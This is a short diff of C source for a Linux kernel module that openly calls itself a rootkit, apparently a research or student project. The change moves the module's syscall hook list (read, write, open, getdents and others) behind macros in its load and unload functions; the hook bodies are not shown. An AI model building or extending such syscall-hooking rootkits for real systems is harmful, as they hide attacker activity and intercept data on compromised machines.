@@ -20,11 +20,6 @@ MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
 MODULE_DESCRIPTION("A Linux kernel rootkit");
 MODULE_VERSION("0.1");
 
-static sysfun_t p_orig_sysfuns[__NR_syscalls] = { NULL };
-
-static hook_t p_syscall_hooks[] =
-    SYSCALL_HOOKS(read, write, open, pread64, sendfile, getdents, getdents64);
-
 static int __init rootkit_init(void)
 {
     int i_err;
@@ -37,7 +32,7 @@ static int __init rootkit_init(void)
         return i_err;
     }
 
-    hook_syscalls(p_syscall_hooks, ARRAY_SIZE(p_syscall_hooks));
+    hook_syscalls(P_SYSCALL_HOOKS, NR_SYSCALL_HOOKS);
 
     pr_info("[ROOTKIT] Module loaded");
     return 0;
@@ -46,7 +41,7 @@ static int __init rootkit_init(void)
 static __exit void rootkit_exit(void)
 {
     // Restore original syscall functions
-    unhook_syscalls(p_syscall_hooks, ARRAY_SIZE(p_syscall_hooks));
+    unhook_syscalls(P_SYSCALL_HOOKS, NR_SYSCALL_HOOKS);
 
     pr_info("[ROOTKIT] Module unloaded");
     return;
